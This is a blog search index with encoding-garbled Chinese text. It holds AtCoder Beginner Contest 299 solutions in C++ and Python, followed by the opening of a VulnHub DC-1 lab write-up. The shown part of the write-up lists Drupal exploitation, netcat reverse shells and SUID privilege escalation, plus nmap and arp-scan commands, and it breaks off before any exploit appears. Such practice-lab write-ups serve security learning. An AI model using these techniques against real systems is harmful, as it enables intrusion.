<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AtCoder Beginner Contest 299</title>
      <link href="/posts/ae73.html"/>
      <url>/posts/ae73.html</url>
      
        <content type="html"><![CDATA[<h1 id="AtCoder-Beginner-Contest-299"><a href="#AtCoder-Beginner-Contest-299" class="headerlink" title="AtCoder Beginner Contest 299"></a>AtCoder Beginner Contest 299</h1><h2 id="A-Treasure-Chest"><a href="#A-Treasure-Chest" class="headerlink" title="A - Treasure Chest"></a>A - Treasure Chest</h2><h3 id="é¢˜ç›®å¤§æ„"><a href="#é¢˜ç›®å¤§æ„" class="headerlink" title="é¢˜ç›®å¤§æ„"></a>é¢˜ç›®å¤§æ„</h3><p>ç»™å®šä¸€ä¸ªåŒ…å« <code>|*.</code>çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­<code>|</code>ä¸¤ä¸ªï¼Œ<code>*</code>ä¸€ä¸ªï¼Œé—®<code>*</code>æ˜¯å¦åœ¨ä¸¤ä¸ª<code>|</code>ä¹‹é—´ã€‚</p><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æ‰¾åˆ°ä¸¤ä¸ª<code>|</code>çš„ä¸‹æ ‡<code>lï¼Œr</code>ä»¥åŠ*çš„ä¸‹æ ‡<code>mid</code>ï¼Œçœ‹çœ‹æ˜¯å¦æ»¡è¶³ <code>l&lt; mid &lt; r</code>å³å¯ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    <span class="type">int</span> a = s.<span class="built_in">find</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">    <span class="type">int</span> b = s.<span class="built_in">find</span>(<span class="string">&#x27;|&#x27;</span>,a + <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> c = s.<span class="built_in">find</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(c &gt; a &amp;&amp; c &lt; b) cout &lt;&lt; <span class="string">&quot;in&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;out&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Trick-Taking"><a href="#B-Trick-Taking" class="headerlink" title="B - Trick Taking"></a>B - Trick Taking</h2><h3 id="é¢˜ç›®å¤§æ„-1"><a href="#é¢˜ç›®å¤§æ„-1" class="headerlink" title="é¢˜ç›®å¤§æ„"></a>é¢˜ç›®å¤§æ„</h3><p>ç»™å®šnä¸ªäººçš„å¡ç‰‡ï¼Œé¢œè‰²ä¸º <code>c[i]</code> ï¼Œæ•°å­—ä¸º <code>r[i]</code> ã€‚</p><p>å¦‚æœå…¶ä¸­æœ‰é¢œè‰²ä¸º T çš„ç‰Œï¼Œåˆ™è¯¥é¢œè‰²ä¸­æ•°å­—æœ€å¤§çš„å¡ç‰‡å¯¹åº”çš„äººèµ¢ã€‚å¦‚æœæ²¡æœ‰ï¼Œåˆ™é¢œè‰²ä¸ºç¬¬ä¸€ä¸ªäººçš„å¡ç‰Œé¢œï¼ˆ å³<code>c[0]</code> ï¼‰ä¸­æ•°å­—æœ€å¤§çš„å¡ç‰‡å¯¹åº”çš„äººèµ¢ã€‚é—®è°èµ¢ã€‚</p><h3 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>åˆ†ä¸¤ç§æƒ…å†µæ¨¡æ‹Ÿå³å¯ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2</span>*<span class="number">1e5</span>*<span class="number">10</span>;;</span><br><span class="line"><span class="type">int</span> c[N],r[N];</span><br><span class="line"><span class="type">int</span> n, t;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (c[i] == t)</span><br><span class="line">        &#123;</span><br><span class="line">            res1 = <span class="built_in">max</span>(res1, r[i]);</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res1 == r[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> res2 = r[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (c[i] == c[<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                res2 = <span class="built_in">max</span>(res2, r[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res2 == r[i])</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  cin &gt;&gt; c[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)  cin &gt;&gt; r[i];</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dango"><a href="#C-Dango" class="headerlink" title="C - Dango"></a>C - Dango</h2><h3 id="é¢˜ç›®å¤§æ„-2"><a href="#é¢˜ç›®å¤§æ„-2" class="headerlink" title="é¢˜ç›®å¤§æ„"></a>é¢˜ç›®å¤§æ„</h3><p>å®šä¹‰ä¸€ç§å­—ç¬¦ä¸²<code>s</code>çš„ç­‰çº§Xæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼‰ï¼Œæ»¡è¶³ä»…åŒ…å«<code>-o</code>ï¼Œä¸”å¤´æˆ–å°¾ä»…ä¸€å¤„ä¸º<code>-</code>ï¼Œå…¶ä½™éƒ½ä¸º<code>o</code>ã€‚å…¶ç­‰çº§Xä¸º<code>o</code>çš„æ•°é‡ã€‚ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²Tï¼Œé—®å…¶å­ä¸²çš„æœ€å¤§ç­‰çº§ã€‚</p><h3 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ä¾æ¬¡éå†å­—ç¬¦ä¸²Tï¼Œé‡åˆ°ä¸¤ä¸ª<code>-</code>æ—¶æœŸé—´å°±æœ‰ä¸€ä¸ªç­‰çº§ã€‚</p><p>ç„¶åå†è€ƒè™‘ä»å¤´åˆ°ç¬¬ä¸€ä¸ª<code>-</code>çš„å­ä¸²ï¼Œä»æœ€åä¸€ä¸ª<code>-</code>åˆ°å°¾çš„å­ä¸²çš„ç­‰çº§ã€‚</p><p>æ³¨æ„å•çº¯çš„ä¸€ä¸ª<code>-</code>å¹¶ä¸æ˜¯åˆæ³•çš„ï¼ˆ0ä¸æ˜¯æ­£æ•´æ•°ï¼‰ã€‚</p><h3 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">S = <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line">S = S + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">ans = -<span class="number">1</span></span><br><span class="line">j = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>) :</span><br><span class="line">    <span class="keyword">if</span> S[i] == <span class="string">&#x27;-&#x27;</span> :</span><br><span class="line">        l = i - j - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> l &gt; <span class="number">0</span> <span class="keyword">and</span> (j &gt;= <span class="number">0</span> <span class="keyword">or</span> i &lt; N) :</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, l)</span><br><span class="line">        j = i</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h2 id="D-Find-by-Query-abc299-d"><a href="#D-Find-by-Query-abc299-d" class="headerlink" title="D - Find by Query (abc299 d)"></a>D - Find by Query (abc299 d)</h2><h3 id="é¢˜ç›®å¤§æ„-3"><a href="#é¢˜ç›®å¤§æ„-3" class="headerlink" title="é¢˜ç›®å¤§æ„"></a>é¢˜ç›®å¤§æ„</h3><p>äº¤äº’é¢˜ã€‚è¿™é‡Œæœ‰ä¸ªé•¿åº¦ä¸ºnçš„01å­—ç¬¦ä¸² sï¼Œå…¶ä¸­$s1=0$ï¼Œ$sn=1$ã€‚ä½ å¯ä»¥è¯¢é—®$si$çš„å€¼ã€‚è¾“å‡ºä¸€ä¸ªä½ç½®$p$æ»¡è¶³$spâ‰ sp+1$ã€‚ç»™å®šå­—ç¬¦ä¸²é•¿åº¦nï¼Œä½ æœ€å¤šé—®20æ¬¡ã€‚ $n&lt;=2Ã—10^5$ã€‚</p><h3 id="è§£é¢˜æ€è·¯-4"><a href="#è§£é¢˜æ€è·¯-4" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æ„Ÿè§‰å¥½åƒå’ŒæŸæ¬¡ cfçš„äº¤äº’é¢˜å¾ˆåƒã€‚</p><p>æ³¨æ„é¢˜æ„ä¿è¯äº†$s1=0ï¼Œsn=1$ã€‚</p><p>é¦–å…ˆè¯¢é—®ä¸­é—´ä½ç½®$mid=\frac{n}{2}$ï¼Œå¦‚æœ$s{mid}=1$ï¼Œç”±äºsn=1ï¼Œæœ€åæƒ…å†µå¾ˆæœ‰å¯èƒ½è¿™ååŠéƒ¨ä»½éƒ½æ˜¯ 1ï¼Œæ˜¾ç„¶æˆ‘ä»¬ä¸è¯¥å»é—®ã€‚ä½†å› ä¸º$s_1=0ï¼Œs_{mid}=1$ï¼Œæ‰€ä»¥å‰åŠéƒ¨ä»½å¿…å®šæœ‰ä¸€å¤„$s_p=0,s_{p+1}=1$ã€‚ åä¹‹$s_{mid}=0$çš„æƒ…å†µåŒç†ã€‚</p><p>è¿™æ ·ï¼Œé€šè¿‡ä¸€æ¬¡è¯¢é—®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠç­”æ¡ˆä¿è¯å­˜åœ¨çš„åŒºé—´ç åŠäº†ã€‚é‚£æœ€å¤šç $logn$æ¬¡å°±æ‰¾åˆ°ç»“æœäº†ã€‚ç”±äº $nâ‰¤2Ã—10^5$ï¼Œæ‰€ä»¥ä¸ä¼šè¶…è¿‡20æ¬¡ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">    std::cin &gt;&gt; N;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = N;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> m = (l + r) / <span class="number">2</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;? &quot;</span> &lt;&lt; m &lt;&lt; std::endl;</span><br><span class="line">        <span class="type">int</span> res;</span><br><span class="line">        std::cin &gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            l = m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;! &quot;</span> &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜æ€è·¯-5"><a href="#è§£é¢˜æ€è·¯-5" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><h2 id="E-Nearest-Black-Vertex"><a href="#E-Nearest-Black-Vertex" class="headerlink" title="E - Nearest Black Vertex"></a>E - Nearest Black Vertex</h2><h3 id="é¢˜ç›®å¤§æ„-4"><a href="#é¢˜ç›®å¤§æ„-4" class="headerlink" title="é¢˜ç›®å¤§æ„"></a>é¢˜ç›®å¤§æ„</h3><p>ç»™å®šä¸€å¼ å›¾ï¼Œè¦æ±‚ç»™ç‚¹æ¶‚é»‘ç™½è‰²ï¼Œè¦æ±‚è‡³å°‘æœ‰ä¸€ä¸ªé»‘ç‚¹ï¼Œä¸”æ»¡è¶³kä¸ªè¦æ±‚ã€‚</p><p>æ¯ä¸ªè¦æ±‚ $(p_i,d_i)$è¡¨ç¤ºç‚¹ piè·ç¦»é»‘ç‚¹çš„æœ€è¿‘è·ç¦»æ°å¥½ä¸º $d_i$ã€‚</p><p>ç‚¹æ•°ã€è¾¹æ•° $â‰¤2000$</p><h2 id="è§£é¢˜æ€è·¯-6"><a href="#è§£é¢˜æ€è·¯-6" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>æ³¨æ„è¾¹æ•°åªæœ‰2000ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¯¹æ¯ä¸ªè¦æ±‚çš„$p_i$è¿›è¡ŒBFSï¼ŒæŠŠè·ç¦»å…¶å°äºdçš„ç‚¹éƒ½æ ‡è®°ä¸ºç™½è‰²ã€‚</p><p>ç„¶åå†å¯¹æ¯ä¸ªè¦æ±‚çš„ $p_i$è¿›è¡Œ BFSï¼ŒæŠŠè·ç¦»å…¶ä¸ºdçš„ä¸”æœªè¢«æ ‡è®°ä¸ºç™½è‰²çš„ç‚¹æ ‡è®°ä¸ºé»‘è‰²ã€‚</p><p>å¦‚æœæœ‰ä¸ªè¦æ±‚æ²¡æœ‰æ‰¾åˆ°å¯ä»¥è¢«æ¶‚é»‘è‰²çš„ç‚¹ï¼Œå°±æ— è§£äº†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> N, M;</span><br><span class="line">    std::cin &gt;&gt; N &gt;&gt; M;</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(N);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        std::cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        u--, v--;</span><br><span class="line">        adj[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">        adj[v].<span class="built_in">push_back</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">bool</span>&gt; <span class="title">black</span><span class="params">(N, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> K;</span><br><span class="line">    std::cin &gt;&gt; K;</span><br><span class="line">    </span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(K)</span>, <span class="title">d</span><span class="params">(K)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; p[i] &gt;&gt; d[i];</span><br><span class="line">        p[i]--;</span><br><span class="line">        </span><br><span class="line">        <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">dis</span><span class="params">(N, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        dis[p[i]] = <span class="number">0</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(p[i]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> x = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (dis[x] &lt; d[i]) &#123;</span><br><span class="line">                black[x] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> y : adj[x]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dis[y] == <span class="number">-1</span>) &#123;</span><br><span class="line">                    dis[y] = dis[x] + <span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(y);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">dis</span><span class="params">(N, <span class="number">-1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (black[i]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(i);</span><br><span class="line">            dis[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> x = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> y : adj[x]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis[y] == <span class="number">-1</span>) &#123;</span><br><span class="line">                dis[y] = dis[x] + <span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; K; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dis[p[i]] != d[i]) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;No\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Yes\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        std::cout &lt;&lt; black[i];</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Square-Subsequence"><a href="#F-Square-Subsequence" class="headerlink" title="F - Square Subsequence"></a>F - Square Subsequence</h2><p>ä¸ä¼š</p><h2 id="G-Minimum-Permutation"><a href="#G-Minimum-Permutation" class="headerlink" title="G - Minimum Permutation"></a>G - Minimum Permutation</h2><p>ä¸ä¼š</p><h2 id="Ex-Dice-Sum-Infinity"><a href="#Ex-Dice-Sum-Infinity" class="headerlink" title="Ex - Dice Sum Infinity"></a>Ex - Dice Sum Infinity</h2><p>ä¸ä¼š</p>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder Beginner Contest </tag>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1é¶æœº</title>
      <link href="/posts/5951.html"/>
      <url>/posts/5951.html</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1é¶æœº"><a href="#DC-1é¶æœº" class="headerlink" title="DC-1é¶æœº"></a>DC-1é¶æœº</h1><h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-1,292/</span><br></pre></td></tr></table></figure><p>å°†ç½‘è·¯æ¨¡å¼æ”¹ä¸ºnetæ¨¡å¼</p><h2 id="ç›¸å…³çŸ¥è¯†ç‚¹"><a href="#ç›¸å…³çŸ¥è¯†ç‚¹" class="headerlink" title="ç›¸å…³çŸ¥è¯†ç‚¹"></a>ç›¸å…³çŸ¥è¯†ç‚¹</h2><ul><li>nmapæ‰«æç½‘æ®µä¸ç«¯å£æœåŠ¡çš„æ¢æµ‹</li><li>msfconsoleä½¿ç”¨</li><li>drupal cmsæ¼æ´åˆ©ç”¨</li><li>netcatåå¼¹shell</li><li>mysqlæ•°æ®åº“æ¸—é€æ€è·¯</li><li>suidææƒ</li></ul><hr><h2 id="åŸºç¡€ä¿¡æ¯æ”¶é›†"><a href="#åŸºç¡€ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºç¡€ä¿¡æ¯æ”¶é›†"></a>åŸºç¡€ä¿¡æ¯æ”¶é›†</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä¸»æœºå‘ç°</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sn -n --min-rate 1000 192.168.101.0/24</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp-scan -l</span></span><br><span class="line">ç«¯å£æ¢æµ‹</span><br><span class="line"><span class="meta prompt_">$ 